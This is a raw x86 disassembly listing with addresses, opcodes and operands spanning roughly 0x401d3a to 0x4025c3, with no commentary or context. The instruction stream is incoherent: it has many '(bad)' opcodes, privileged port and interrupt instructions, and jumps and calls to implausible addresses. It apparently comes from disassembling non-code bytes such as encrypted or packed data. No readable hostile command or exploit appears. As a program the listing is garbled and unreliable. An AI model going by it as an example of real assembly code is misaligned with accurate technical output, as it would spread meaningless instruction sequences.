  401d3a:	or     dl,bl
  401d3c:	repz loop 0x401d36
  401d3f:	loop   0x401cf7
  401d41:	lods   eax,DWORD PTR ds:[esi]
  401d42:	shr    DWORD PTR [ecx+ebx*8-0x1144851],cl
  401d49:	mov    edi,0xfffbfaf2
  401d4e:	out    dx,eax
  401d4f:	loope  0x401d4e
  401d51:	shl    esi,0xb
  401d54:	rcr    dl,cl
  401d56:	cli    
  401d57:	or     DWORD PTR [ebx],eax
  401d59:	in     al,dx
  401d5a:	fldz   
  401d5c:	add    eax,0xa4d1a8c7
  401d61:	(bad)  
  401d62:	mov    al,0xf7
  401d64:	mov    dl,0xca
  401d66:	mov    ch,0xbb
  401d68:	aad    0xc5
  401d6a:	lock jmp 0xc7f2:0xfcc3bbc3
  401d72:	add    bl,dl
  401d74:	retf   
  401d75:	fsubr  st,st(2)
  401d77:	out    dx,al
  401d78:	cli    
  401d79:	add    al,0xfc
  401d7b:	out    0xd2,al
  401d7d:	int    0xe8
  401d7f:	repnz in eax,dx
  401d81:	out    0xac,al
  401d83:	aad    0xd7
  401d85:	(bad)
  401d88:	aad    0xee
  401d8a:	cmc    
  401d8b:	int3   
  401d8c:	mov    edi,0xccd9cdbc
  401d91:	ffree  st(4)
  401d93:	stc    
  401d94:	sti    
  401d95:	clc    
  401d96:	fadd   st,st(1)
  401d98:	push   cs
  401d99:	call   0xe30b3178
  401d9e:	xlat   BYTE PTR ds:[ebx]
  401d9f:	loope  0x401d85
  401da1:	scas   eax,DWORD PTR es:[edi]
  401da2:	aad    0xd4
  401da4:	in     eax,0xc6
  401da6:	leave  
  401da7:	lock into 
  401da9:	retf   0xccd2
  401dac:	(bad)  
  401dae:	ret    
  401daf:	into   
  401db0:	icebp  
  401db1:	stc    
  401db2:	fcmovu st,st(2)
  401db4:	rcl    ebp,1
  401db6:	fcmovu st,st(3)
  401db8:	out    dx,eax
  401db9:	out    dx,eax
  401dba:	in     al,dx
  401dbb:	loopne 0x401dd0
  401dbd:	jmp    0xf135c691
  401dc2:	jmp    0xe4f9e994
  401dc7:	retf   
  401dc8:	(bad)  
  401dca:	mov    ch,0x2
  401dcc:	repnz aam 0xe0
  401dcf:	add    eax,DWORD PTR [eax]
  401dd1:	loope  0x401dc9
  401dd3:	add    eax,0xc7c1c7e4
  401dd8:	faddp  st(6),st
  401dda:	retf   
  401ddb:	(bad)
  401dde:	scas   al,BYTE PTR es:[edi]
  401ddf:	fmul   st(7),st
  401de1:	(bad)  
  401de2:	mov    bl,0xc5
  401de4:	imul   ebp
  401de6:	(bad)  
  401de8:	shr    cl,cl
  401dea:	rcl    ebp,1
  401dec:	into   
  401ded:	int3   
  401dee:	rcr    ecx,1
  401df0:	in     eax,dx
  401df1:	std    
  401df2:	stc    
  401df3:	ffreep st(1)
  401df5:	xlat   BYTE PTR ds:[ebx]
  401df6:	loopne 0x401df3
  401df8:	in     al,0xb
  401dfa:	retf   
  401dfb:	push   es
  401dfc:	fcom   st(3)
  401dfe:	rcr    ah,cl
  401e00:	in     al,dx
  401e01:	int    0xc1
  401e03:	out    dx,al
  401e04:	mov    dh,0xf4
  401e06:	(bad)  
  401e07:	shl    ebp,cl
  401e09:	clc    
  401e0a:	mov    ecx,0xd7eefef4
  401e0f:	ret    
  401e10:	fucom  st(5)
  401e12:	icebp  
  401e13:	pop    es
  401e14:	rcr    bh,1
  401e16:	out    0xe7,eax
  401e18:	or     esp,eax
  401e1a:	int3   
  401e1b:	jecxz  0x401e0c
  401e1d:	fdiv   st,st(3)
  401e1f:	in     eax,0xb0
  401e21:	int    0xe9
  401e23:	repnz lods al,BYTE PTR ds:[esi]
  401e25:	div    BYTE PTR [edx+ecx*8-0x30291015]
  401e2c:	icebp  
  401e2d:	loop   0x401e04
  401e2f:	add    edx,esi
  401e31:	out    0xf9,eax
  401e33:	repnz jmp 0x1301:0xeaf7c9e4
  401e3b:	cli    
  401e3c:	jmp    0xc3c8:0xaccad0e2
  401e43:	(bad)  
  401e44:	mov    dh,0xcc
  401e46:	(bad)  
  401e47:	mov    edx,0xebefbaba
  401e4c:	mov    ah,0x2
  401e4e:	cld    
  401e4f:	loope  0x401e05
  401e51:	add    bh,dl
  401e53:	loope  0x401e39
  401e55:	idiv   BYTE PTR [esi-0x190af8f5]
  401e5b:	add    eax,0xaec9e6ed
  401e60:	mov    bh,0xe9
  401e62:	leave  
  401e63:	int3   
  401e64:	jmp    0xf8db:0xefc4d7e0
  401e6b:	mov    ch,0xfd
  401e6d:	mov    eax,0xdedbc1f3
  401e72:	ror    bl,0x3
  401e75:	out    0xc1,al
  401e77:	or     DWORD PTR [eax],ecx
  401e79:	out    dx,eax
  401e7a:	enter  0xe0cc,0xac
  401e7e:	stos   BYTE PTR es:[edi],al
  401e7f:	ror    dh,0xb7
  401e82:	icebp  
  401e83:	out    0xf6,eax
  401e85:	(bad)
  401e88:	out    dx,eax
  401e89:	(bad)  
  401e8b:	mov    ecx,0xbefdf702
  401e90:	(bad)  
  401e91:	mov    esi,0xe7ddc407
  401e96:	push   es
  401e97:	fisttp WORD PTR [edi]
  401e99:	jmp    0xce4606a7
  401e9e:	out    0xd6,eax
  401ea0:	(bad)  
  401ea1:	retf   0xc4ad
  401ea4:	(bad)  
  401ea5:	aam    0xfa
  401ea7:	hlt    
  401ea8:	cli    
  401ea9:	mov    dh,0x3
  401eab:	aam    0xea
  401ead:	mov    ebx,0xf3f5d2d7
  401eb2:	shl    eax,1
  401eb4:	lock fsubp st(0),st
  401eb7:	add    al,0x6
  401eb9:	fcmovne st,st(6)
  401ebb:	(bad)
  401ebe:	loopne 0x401ea7
  401ec0:	in     al,dx
  401ec1:	ror    esp,1
  401ec3:	call   0xb507eb82
  401ec8:	repnz fcmovnbe st,st(0)
  401ecb:	fcom   st(1)
  401ecd:	in     al,dx
  401ece:	(bad)  
  401ecf:	rcr    dl,cl
  401ed1:	stc    
  401ed2:	icebp  
  401ed3:	cld    
  401ed4:	icebp  
  401ed5:	rol    dh,0xbd
  401ed8:	fcomip st,st(4)
  401eda:	repz (bad) 
  401edd:	stos   BYTE PTR es:[edi],al
  401ede:	xlat   BYTE PTR ds:[ebx]
  401edf:	xlat   BYTE PTR ds:[ebx]
  401ee0:	int    0xef
  401ee2:	in     al,0xc7
  401ee4:	out    dx,al
  401ee5:	mov    edx,0xd1cde8cd
  401eea:	(bad)  
  401eec:	enter  0xf6f0,0xef
  401ef0:	(bad)  
  401ef2:	fsub   st,st(2)
  401ef4:	(bad)  
  401ef7:	or     dl,ch
  401ef9:	or     al,0xf9
  401efb:	in     al,dx
  401efc:	in     eax,0xea
  401efe:	(bad)  
  401eff:	mov    bh,0xec
  401f01:	lock call 0xf1f10af2
  401f07:	into   
  401f08:	(bad)  
  401f0a:	fcompp 
  401f0c:	fmul   st,st(7)
  401f0e:	xlat   BYTE PTR ds:[ebx]
  401f0f:	fild   DWORD PTR [ebx]
  401f11:	rcl    esi,0xf6
  401f14:	retf   0xe5fb
  401f17:	fucom  st(6)
  401f19:	enter  0xe506,0xb
  401f1d:	retf   
  401f1e:	scas   eax,DWORD PTR es:[edi]
  401f1f:	mov    esi,0xc2bcdce7
  401f24:	hlt    
  401f25:	sar    DWORD PTR [ebx-0x32210f],0xd4
  401f2c:	out    dx,eax
  401f2d:	loop   0x401f0a
  401f2f:	fcomi  st,st(3)
  401f31:	hlt    
  401f32:	ror    ebx,1
  401f34:	mov    esp,0xc809e2e9
  401f39:	ret    
  401f3a:	in     eax,0xce
  401f3c:	iret   
  401f3d:	mov    esp,0xe3c0e7cc
  401f42:	mov    ah,0xe0
  401f44:	ret    0xbac7
  401f47:	fsubrp st(5),st
  401f49:	(bad)  
  401f4b:	hlt    
  401f4c:	mov    ah,0xb9
  401f4e:	mov    esi,0xd9c203bc
  401f53:	fmul   QWORD PTR [edx]
  401f55:	add    esp,esp
  401f57:	cmc    
  401f58:	sti    
  401f59:	in     al,dx
  401f5a:	out    0xdd,eax
  401f5c:	or     eax,0xd7e7cbf1
  401f61:	ret    
  401f62:	lods   eax,DWORD PTR ds:[esi]
  401f63:	shr    BYTE PTR [eax-0x17494b17],1
  401f69:	(bad)  
  401f6b:	ret    
  401f6c:	in     al,dx
  401f6d:	jmp    0xfc20024a
  401f72:	add    ah,bh
  401f74:	jmp    0x1ee:0xf9ca03f5
  401f7b:	out    0xe6,eax
  401f7d:	shr    BYTE PTR [ecx+eax*8-0x3e35392b],cl
  401f84:	leave  
  401f85:	iret   
  401f86:	aad    0xe6
  401f88:	aad    0xc5
  401f8a:	hlt    
  401f8b:	jmp    0x5df:0xc0d601dc
  401f92:	ret    0x6d1
  401f95:	add    al,0xd9
  401f97:	cli    
  401f98:	loopne 0x401f9f
  401f9a:	into   
  401f9b:	loope  0x401f90
  401f9d:	fxch   st(0)
  401f9f:	mov    esp,0xd3b2c1e6
  401fa4:	rcl    esi,0xf4
  401fa7:	(bad)  
  401fa9:	icebp  
  401faa:	sti    
  401fab:	cld    
  401fac:	mov    ebp,0xf2b9cdc9
  401fb1:	int    0xe4
  401fb3:	jecxz  0x401fac
  401fb5:	call   0xfb250184
  401fba:	(bad)  
  401fbb:	(bad)  
  401fbd:	jmp    0xf80be86f
  401fc2:	lock mov bh,0xed
  401fc5:	loopne 0x401fbf
  401fc7:	in     eax,0xc9
  401fc9:	ffree  st(4)
  401fcb:	(bad)  
  401fcc:	loope  0x401fcf
  401fce:	mov    esp,0xd4bdd603
  401fd3:	out    0xc5,eax
  401fd5:	rol    esi,1
  401fd7:	jmp    0x401fdb
  401fd9:	call   0xbf230cc2
  401fde:	(bad)  
  401fe0:	mov    esi,0xc5d1e7cc
  401fe5:	stc    
  401fe6:	aad    0xb5
  401fe8:	in     eax,0xf2
  401fea:	lock mov ah,0x1
  401fed:	aam    0xbd
  401fef:	repz int 0xfb
  401ff2:	xlat   BYTE PTR ds:[ebx]
  401ff3:	hlt    
  401ff4:	(bad)  
  401ff6:	fucomi st,st(0)
  401ff8:	jmp    0xe4090bc1
  401ffd:	fsub   st(5),st
  401fff:	in     eax,0xc5
  402001:	(bad)  
  402002:	lods   al,BYTE PTR ds:[esi]
  402003:	mov    cl,0xc9
  402005:	retf   
  402006:	(bad)  
  402008:	ror    eax,1
  40200a:	in     al,dx
  40200b:	enter  0xe8d1,0xbd
  40200f:	pop    es
  402010:	fstp   TBYTE PTR [ebp+0xae000e6]
  402016:	dec    DWORD PTR [edi]
  402018:	add    al,0xe0
  40201a:	fisttp QWORD PTR ds:0xc4d2a7f9
  402020:	aad    0xbc
  402022:	loope  0x402010
  402024:	in     al,0xd6
  402026:	mov    cl,0xea
  402028:	jmp    0xf3fbed15
  40202d:	loope  0x402032
  40202f:	fistp  QWORD PTR [edi-0x3e051d19]
  402035:	fucom  st(1)
  402037:	std    
  402038:	call   0xc261916
  40203d:	in     al,dx
  40203e:	mov    cl,0xc8
  402040:	(bad)
  402043:	ret    
  402044:	xlat   BYTE PTR ds:[ebx]
  402045:	enter  0xdaeb,0xe6
  402049:	push   ebx
  40204b:	into   
  40204c:	call   0xdef60941
  402051:	lock repz fst st(6)
  402055:	test   DWORD PTR [ecx],0xcbe40dc8
  40205b:	jmp    0xf1d7:0xbce0c10c
  402062:	loopne 0x402052
  402064:	shr    edi,cl
  402066:	iret   
  402067:	cli    
  402068:	enter  0xcefc,0xec
  40206c:	push   esp
  40206e:	pop    es
  40206f:	cld    
  402070:	into   
  402071:	add    al,0xf2
  402073:	(bad)  
  402074:	(bad)  
  402075:	ffree  st(7)
  402077:	loope  0x402064
  402079:	fld1   
  40207b:	jmp    0xa5fce168
  402080:	test   ecx,0xd6bac0e0
  402086:	out    dx,al
  402087:	hlt    
  402088:	les    esi,FWORD PTR [ebp-0x22262228]
  40208e:	fcomp  st(0)
  402090:	f2xm1  
  402092:	(bad)  
  402093:	jmp    0xd9c8:0xfde5e7c4
  40209a:	add    eax,edi
  40209c:	shl    DWORD PTR [edi-0xf1d5638],cl
  4020a2:	div    edx
  4020a4:	(bad)  
  4020a5:	mov    dh,0xb5
  4020a7:	int3   
  4020a8:	out    dx,eax
  4020a9:	test   cl,0xb1
  4020ac:	cld    
  4020ad:	in     eax,dx
  4020ae:	mov    eax,0xffbbe7fc
  4020b3:	std    
  4020b4:	add    BYTE PTR [esi+esi*8],al
  4020b7:	clc    
  4020b8:	iret   
  4020b9:	push   es
  4020ba:	or     esp,esp
  4020bc:	call   0xcd0cedb0
  4020c1:	int    0xf0
  4020c3:	lods   eax,DWORD PTR ds:[esi]
  4020c4:	hlt    
  4020c5:	jmp    0xd6e8:0xd4cfd9e9
  4020cc:	test   al,0xd9
  4020cf:	add    ebx,eax
  4020d1:	ffree  st(3)
  4020d3:	sar    esi,1
  4020d5:	(bad)  
  4020d6:	jmp    0x4020d7
  4020d8:	loope  0x4020e7
  4020da:	jecxz  0x4020b6
  4020dc:	jmp    0x4020cc
  4020de:	(bad)  
  4020df:	test   al,0xbd
  4020e1:	out    0xc2,eax
  4020e3:	sti    
  4020e4:	div    BYTE PTR [ecx-0x2f260e10]
  4020ea:	out    dx,al
  4020eb:	div    al
  4020ed:	out    dx,al
  4020ee:	mov    esi,0xdcc1e0dc
  4020f3:	icebp  
  4020f4:	pop    es
  4020f5:	sar    esp,1
  4020f7:	add    ebp,esp
  4020f9:	in     eax,0xff
  4020fb:	(bad)  
  4020fd:	iret   
  4020fe:	test   al,0xef
  402100:	mov    dh,0xcb
  402102:	out    dx,al
  402103:	ret    0xd1f3
  402106:	fmul   st,st(1)
  402108:	(bad)  
  402109:	enter  0xb4e3,0xff
  40210d:	fmul   st(5),st
  40210f:	ret    
  402110:	loop   0x402107
  402112:	fadd   QWORD PTR [ebx]
  402114:	shl    cl,1
  402116:	pop    es
  402117:	loop   0x40211f
  402119:	stc    
  40211a:	add    bl,ah
  40211c:	call   0xd409ea08
  402121:	cmc    
  402122:	aam    0xcf
  402124:	xlat   BYTE PTR ds:[ebx]
  402125:	mov    cl,0xe9
  402127:	mov    edi,0xcafdbbd1
  40212c:	(bad)  
  40212e:	int    0xf1
  402130:	loopne 0x40210a
  402132:	lock shl bl,cl
  402135:	or     edi,edx
  402137:	aad    0xa
  402139:	(bad)  
  40213b:	jmp    0xc0ec:0xc9bca7cb
  402142:	mov    ah,0xb4
  402144:	int3   
  402145:	(bad)  
  402147:	iret   
  402148:	(bad)  
  402149:	(bad)  
  40214b:	repnz fcmovnu st,st(4)
  40214e:	enter  0xc2dd,0xd0
  402152:	loop   0x402118
  402154:	sar    dh,0x9
  402157:	hlt    
  402158:	loop   0x402137
  40215a:	add    bh,bh
  40215c:	retf   
  40215d:	mov    edi,0xceeccce8
  402162:	hlt    
  402163:	lods   eax,DWORD PTR ds:[esi]
  402164:	mov    ebx,0xaccdf8d4
  402169:	fidivr WORD PTR [ecx-0x301e03fd]
  40216f:	mov    edi,0xe7f0d1d5
  402174:	loope  0x40215e
  402176:	hlt    
  402177:	test   DWORD PTR [edx],0xf80dc5ff
  40217d:	stos   BYTE PTR es:[edi],al
  40217e:	shl    ecx,0xeb
  402181:	enter  0xe1e6,0xc6
  402185:	mov    dl,0xae
  402187:	jmp    0xcc12ed5a
  40218c:	ret    0xdbcd
  40218f:	add    edx,esp
  402191:	add    esp,edi
  402193:	inc    esi
  402195:	std    
  402196:	sar    al,0xf
  402199:	fisttp QWORD PTR [eax]
  40219b:	cli    
  40219c:	rcl    ebx,cl
  40219e:	loope  0x40215d
  4021a0:	aad    0xb5
  4021a2:	aam    0xd7
  4021a4:	sar    DWORD PTR [ebx-0x3a044f1a],1
  4021aa:	div    ah
  4021ac:	int    0xb9
  4021ae:	in     eax,dx
  4021af:	ret    0xd3d1
  4021b2:	(bad)  
  4021b3:	clc    
  4021b4:	add    DWORD PTR [edx],ecx
  4021b6:	enter  0xf500,0xf8
  4021ba:	leave  
  4021bb:	add    dh,dl
  4021bd:	loop   0x402165
  4021bf:	iret   
  4021c0:	retf   0xf6c2
  4021c3:	mov    al,0xb2
  4021c5:	iret   
  4021c6:	mov    edx,0xbac9f4df
  4021cb:	(bad)  
  4021cc:	in     al,dx
  4021cd:	(bad)  
  4021cf:	(bad)  
  4021d0:	fdivr  DWORD PTR [esi-0x1090b42]
  4021d6:	add    eax,0xcb08efe8
  4021db:	std    
  4021dc:	jmp    0xd603ff8f
  4021e1:	call   0xed2a03a7
  4021e6:	sti    
  4021e7:	retf   
  4021e8:	int    0xbd
  4021ea:	into   
  4021eb:	cli    
  4021ec:	mov    esp,0xee02c8
  4021f1:	lock les ecx,FWORD PTR [ebx]
  4021f4:	fxch   st(2)
  4021f6:	sar    cl,0xa
  4021f9:	add    edi,esp
  4021fb:	in     al,0x11
  4021fd:	mov    eax,0xf2cbb7de
  402202:	mov    esp,0xaeecced6
  402207:	mov    eax,0xefbbf3b7
  40220c:	in     eax,dx
  40220d:	add    ecx,esp
  40220f:	fld    st(7)
  402211:	add    eax,0xe30ad5c3
  402216:	(bad)  
  402217:	jmp    0x4021e7
  402219:	fsubrp st(7),st
  40221b:	or     al,0xcc
  40221d:	sar    BYTE PTR [esi-0x2948503c],1
  402223:	out    dx,eax
  402224:	sti    
  402225:	(bad)
  402228:	aad    0xe9
  40222a:	cld    
  40222b:	shr    cl,cl
  40222d:	imul   esp
  40222f:	mov    ebp,0xbcd9dbe2
  402234:	jmp    0x40221e
  402236:	ror    BYTE PTR [eax],1
  402238:	out    0xe3,eax
  40223a:	iret   
  40223b:	fucomi st,st(5)
  40223d:	repz int3 
  40223f:	scas   eax,DWORD PTR es:[edi]
  402240:	lock in al,dx
  402242:	shl    esi,0xe7
  402245:	shr    edx,cl
  402247:	jmp    0x402213
  402249:	clc    
  40224a:	aam    0xf9
  40224c:	not    cl
  40224e:	out    dx,al
  40224f:	add    DWORD PTR [esi+edx*8+0x2bcf4d2],esi
  402256:	stc    
  402257:	cmc    
  402258:	sti    
  402259:	cld    
  40225a:	call   0xd225ef5d
  40225f:	(bad)  
  402260:	mov    dh,0xef
  402262:	(bad)  
  402263:	loop   0x40224d
  402265:	mov    ecx,0xe9cdf0f1
  40226a:	std    
  40226b:	mov    ch,0xff
  40226d:	sti    
  40226e:	call   0xcd21fd73
  402273:	out    0xcb,al
  402275:	add    eax,0xdafbffd0
  40227a:	enter  0xc90f,0xee
  40227e:	mov    eax,0xcce2f6ed
  402283:	fcomi  st,st(7)
  402285:	cli    
  402286:	(bad)  
  402287:	div    DWORD PTR [ebp-0x17113617]
  40228d:	mov    esp,0xe0ffd9bd
  402292:	sar    ah,1
  402294:	pop    es
  402295:	jmp    0xe901089a
  40229a:	(bad)  
  40229b:	(bad)  
  40229d:	scas   al,BYTE PTR es:[edi]
  40229e:	repz in al,dx
  4022a0:	lods   al,BYTE PTR ds:[esi]
  4022a1:	repz loop 0x402296
  4022a4:	(bad)  
  4022a5:	ror    esi,cl
  4022a7:	mov    ah,0xb0
  4022a9:	mov    dh,0xf0
  4022ab:	icebp  
  4022ac:	rcl    cl,cl
  4022ae:	mov    dh,0xc1
  4022b0:	mov    ebp,0xc4bdd7cc
  4022b5:	rcr    ecx,1
  4022b7:	or     DWORD PTR [edx],ecx
  4022b9:	cli    
  4022ba:	in     eax,dx
  4022bb:	cld    
  4022bc:	add    ecx,ecx
  4022be:	jmp    0xb0f3068c
  4022c3:	(bad)  
  4022c4:	mov    al,0xcd
  4022c6:	out    dx,al
  4022c7:	neg    ebx
  4022c9:	int3   
  4022ca:	(bad)  
  4022cc:	add    edx,ebx
  4022ce:	sti    
  4022cf:	jecxz  0x4022c2
  4022d1:	faddp  st(6),st
  4022d3:	loopne 0x40229c
  4022d5:	(bad)  
  4022d6:	cli    
  4022d7:	fmulp  st(6),st
  4022d9:	or     eax,0xc0f3fce0
  4022de:	leave  
  4022df:	(bad)  
  4022e0:	mov    dh,0xf2
  4022e2:	imul   ebx
  4022e4:	repnz (bad) 
  4022e7:	enter  0xb3f9,0xd8
  4022eb:	jmp    0xedd6:0xceeecfc3
  4022f2:	shl    ebp,0x5
  4022f5:	add    bh,ah
  4022f7:	call   0x639eee7
  4022fc:	retf   0xe4ec
  4022ff:	fadd   st(3),st
  402301:	shr    ah,cl
  402303:	lock sti 
  402305:	loopne 0x4022f7
  402307:	repnz icebp 
  402309:	shr    ebx,1
  40230b:	cld    
  40230c:	(bad)  
  40230e:	sar    BYTE PTR [ecx-0x11b26fd],0xd0
  402315:	sti    
  402316:	retf   
  402317:	fsubr  st(4),st
  402319:	into   
  40231a:	out    0xee,eax
  40231c:	or     eax,ebp
  40231e:	in     al,0xe6
  402320:	into   
  402321:	int    0xc9
  402323:	cli    
  402324:	(bad)  
  402325:	cmc    
  402326:	mov    ch,0xc6
  402328:	mov    ebx,0xf4fcf4fd
  40232d:	fcomi  st,st(4)
  40232f:	out    0xe2,eax
  402331:	mov    esp,0xf700e2f7
  402336:	fcmovnb st,st(0)
  402338:	(bad)
  40233b:	(bad)  
  40233d:	shr    eax,0xac
  402340:	int3   
  402341:	mov    ch,0xcc
  402344:	div    ah
  402346:	mov    edx,0xf9f8fdf1
  40234b:	fucomp st(2)
  40234d:	(bad)  
  40234f:	clc    
  402350:	out    0xd8,eax
  402352:	shl    ch,1
  402354:	(bad)  
  402356:	cli    
  402357:	std    
  402358:	dec    bl
  40235a:	jmp    0xf1fffe3a
  40235f:	ror    bh,0xb6
  402362:	loopne 0x402311
  402364:	out    0xf7,eax
  402366:	jmp    0xb8f50324
  40236b:	mov    edx,0xfecdefdc
  402370:	mov    ah,0xfc
  402372:	add    al,bh
  402374:	loopne 0x40235e
  402376:	retf   0x905
  402379:	(bad)  
  40237b:	adc    dh,cl
  40237d:	into   
  40237e:	in     al,0xe2
  402380:	call   0xd72cf737
  402385:	(bad)  
  402386:	mov    cl,0xfe
  402388:	div    bh
  40238a:	iret   
  40238b:	in     eax,dx
  40238c:	retf   0xf5b8
  40238f:	repnz add dl,cl
  402392:	in     eax,0xd3
  402394:	ret    0x2f7
  402397:	or     edi,ebp
  402399:	fcmovu st,st(6)
  40239b:	call   0xd726d16c
  4023a0:	in     al,0xae
  4023a2:	shr    bh,0xd1
  4023a5:	mov    ecx,0xe9b4b4d3
  4023aa:	xlat   BYTE PTR ds:[ebx]
  4023ab:	clc    
  4023ac:	fidivr DWORD PTR [edi-0x1a111f08]
  4023b2:	xlat   BYTE PTR ds:[ebx]
  4023b3:	ror    DWORD PTR [ebx],1
  4023b5:	cli    
  4023b6:	jmp    0xec290dba
  4023bb:	out    dx,al
  4023bc:	in     al,dx
  4023bd:	mov    dl,0xd3
  4023bf:	rcr    dh,0xab
  4023c2:	mov    ah,0xc7
  4023c4:	retf   0xb9ec
  4023c7:	int    0xd5
  4023c9:	mov    eax,0xd5cfb5db
  4023ce:	loopne 0x4023c0
  4023d0:	sar    BYTE PTR [ebx+0x7e1d8ba],1
  4023d6:	aam    0xe6
  4023d8:	or     ch,ch
  4023da:	int    0xda
  4023dc:	int    0xd2
  4023de:	out    0xdd,eax
  4023e0:	mov    esp,0xc2c2e8f4
  4023e5:	icebp  
  4023e6:	jmp    0xec1b1ae0
  4023eb:	(bad)  
  4023ed:	shl    BYTE PTR [esi-0xe0b2329],cl
  4023f3:	idiv   bl
  4023f5:	fcmove st,st(1)
  4023f7:	or     BYTE PTR [eax],cl
  4023f9:	int    0xfc
  4023fb:	enter  0xbf0a,0xe2
  4023ff:	out    dx,al
  402400:	jecxz  0x4023e4
  402402:	(bad)
  402405:	mov    al,0xf0
  402407:	aad    0xd7
  402409:	cli    
  40240a:	sar    cl,1
  40240c:	iret   
  40240d:	(bad)  
  40240f:	fld    QWORD PTR [edi]
  402411:	(bad)  
  402413:	icebp  
  402414:	(bad)  
  402416:	shl    edi,0xc6
  402419:	fcom   DWORD PTR [ebx]
  40241b:	inc    DWORD PTR [esi]
  40241d:	(bad)  
  40241f:	(bad)
  402422:	ror    dl,1
  402424:	aad    0xb3
  402426:	mov    edx,0xb5d3cdf2
  40242b:	rcl    al,cl
  40242d:	ret    0xdbcf
  402430:	(bad)  
  402431:	fldpi  
  402433:	hlt    
  402434:	aad    0xd5
  402436:	clc    
  402437:	add    dh,dl
  402439:	hlt    
  40243a:	int3   
  40243b:	add    ebx,edx
  40243d:	loope  0x402424
  40243f:	leave  
  402440:	mov    esp,0xacf5cff2
  402445:	mov    bh,0xcb
  402447:	mov    ch,0xd9
  402449:	fnstsw WORD PTR [eax-0x32930]
  40244f:	(bad)  
  402451:	cli    
  402452:	repz hlt 
  402454:	or     eax,esp
  402456:	out    0xea,eax
  402458:	fsubp  st(4),st
  40245a:	adc    edi,edi
  40245c:	stc    
  40245d:	jmp    0xe8c6:0xc9bea8e5
  402464:	call   0xbb392062
  402469:	fsubp  st(6),st
  40246b:	clc    
  40246c:	out    dx,eax
  40246d:	cli    
  40246e:	mov    eax,0xc0f6f903
  402473:	add    DWORD PTR [ebx],eax
  402475:	retf   
  402476:	jmp    0xdf0b1079
  40247b:	(bad)  
  40247d:	fucomip st,st(1)
  40247f:	iret   
  402480:	call   0xe602f06e
  402485:	mov    bl,0xc0
  402487:	out    0xd0,al
  402489:	cmc    
  40248a:	out    dx,eax
  40248b:	into   
  40248c:	enter  0xfcf0,0xf6
  402490:	add    bl,al
  402492:	cli    
  402493:	cmc    
  402494:	pop    es
  402495:	loop   0x402481
  402497:	or     edx,esp
  402499:	or     al,0xd8
  40249b:	rcl    DWORD PTR [edx],0xca
  40249e:	in     eax,dx
  40249f:	repz jecxz 0x402471
  4024a2:	hlt    
  4024a3:	rol    cl,0xc8
  4024a6:	aad    0xc8
  4024a8:	int    0xe4
  4024aa:	jmp    0x402496
  4024ac:	int3   
  4024ad:	not    bl
  4024af:	sti    
  4024b0:	sar    edx,0xba
  4024b3:	(bad)  
  4024b4:	aad    0x6
  4024b6:	aad    0xdb
  4024b8:	or     cl,BYTE PTR [edx]
  4024ba:	jmp    0x402494
  4024bc:	cli    
  4024bd:	test   eax,0xacb7dde9
  4024c2:	in     eax,dx
  4024c3:	mov    ah,0xba
  4024c5:	leave  
  4024c6:	mov    ebx,0xbcf2dddb
  4024cb:	iret   
  4024cc:	call   eax
  4024ce:	stc    
  4024cf:	in     al,dx
  4024d0:	icebp  
  4024d1:	(bad)  
  4024d2:	fincstp 
  4024d4:	or     ebx,edi
  4024d6:	out    dx,eax
  4024d7:	loope  0x4024de
  4024d9:	add    ecx,DWORD PTR [edx]
  4024db:	fmul   st,st(3)
  4024dd:	scas   al,BYTE PTR es:[edi]
  4024de:	iret   
  4024df:	out    dx,al
  4024e0:	mov    cl,0xb7
  4024e2:	loope  0x4024b8
  4024e4:	test   al,0xee
  4024e6:	fadd   st,st(6)
  4024e8:	in     eax,dx
  4024e9:	mov    esi,0xf2e8e9bf
  4024ee:	aam    0xd3
  4024f0:	mov    ah,0xdf
  4024f2:	div    ebx
  4024f4:	push   es
  4024f5:	clc    
  4024f6:	mul    dh
  4024f8:	or     bl,cl
  4024fa:	fcmovu st,st(4)
  4024fc:	loope  0x4024ad
  4024fe:	jmp    0x4024be
  402500:	leave  
  402501:	icebp  
  402502:	jmp    0xdc0ffeca
  402507:	mov    al,0xdf
  402509:	jmp    0xf7fe:0xedbadbd9
  402510:	neg    ch
  402512:	xlat   BYTE PTR ds:[ebx]
  402513:	clc    
  402514:	(bad)  
  402516:	fcmovb st,st(6)
  402518:	(bad)  
  402519:	or     eax,0xadc413c2
  40251e:	into   
  40251f:	shl    bh,1
  402521:	loopne 0x402511
  402523:	out    0xc8,eax
  402525:	cmc    
  402526:	out    dx,eax
  402527:	mov    eax,0xd9ecc8ed
  40252c:	mov    ah,0xf1
  40252e:	rcl    edi,1
  402530:	ror    ah,cl
  402532:	add    eax,0xae20add
  402537:	call   0xd429121c
  40253c:	(bad)  
  40253e:	jecxz  0x40251c
  402540:	mov    ebp,0xeadadcca
  402545:	into   
  402546:	jmp    0xd5001af8
  40254b:	xlat   BYTE PTR ds:[ebx]
  40254c:	(bad)  
  40254d:	jecxz  0x40254f
  40254f:	into   
  402550:	loopne 0x402527
  402552:	fstp   st(2)
  402554:	icebp  
  402555:	cli    
  402556:	hlt    
  402557:	aam    0xe0
  402559:	ret    
  40255a:	(bad)  
  40255c:	repz scas eax,DWORD PTR es:[edi]
  40255e:	(bad)  
  402560:	imul   ecx
  402562:	int3   
  402563:	ret    0xc1b6
  402566:	hlt    
  402567:	iret   
  402568:	mov    edi,0xe9c3fbda
  40256d:	hlt    
  40256e:	icebp  
  40256f:	rol    al,cl
  402571:	std    
  402572:	xlat   BYTE PTR ds:[ebx]
  402573:	clc    
  402574:	lock or cl,al
  402577:	(bad)  
  402578:	in     eax,dx
  402579:	lds    ecx,FWORD PTR [eax]
  40257b:	out    0xdf,al
  40257d:	(bad)  
  40257e:	loop   0x40255d
  402580:	shl    esp,1
  402582:	div    DWORD PTR [edx-0x350c4e25]
  402588:	into   
  402589:	(bad)  
  40258a:	in     eax,dx
  40258b:	jmp    0xd9ed:0xf5f3d8fd
  402592:	add    edi,DWORD PTR [edx+edi*8-0x43144139]
  402599:	fiadd  WORD PTR [edx]
  40259b:	les    ecx,FWORD PTR ds:0xf0a9afb9
  4025a1:	mov    dl,0xce
  4025a3:	not    ch
  4025a5:	loope  0x40257f
  4025a7:	aam    0xd0
  4025a9:	iret   
  4025aa:	(bad)  
  4025ab:	clc    
  4025ac:	add    DWORD PTR [edx],eax
  4025ae:	pop    es
  4025af:	jecxz  0x402585
  4025b1:	cli    
  4025b2:	add    al,0x3
  4025b4:	cli    
  4025b5:	add    DWORD PTR [edi],ecx
  4025b7:	retf   0xd90b
  4025ba:	in     al,dx
  4025bb:	jmp    0x4025a0
  4025bd:	retf   0xe5b2
  4025c0:	(bad)
  4025c3:	retf   
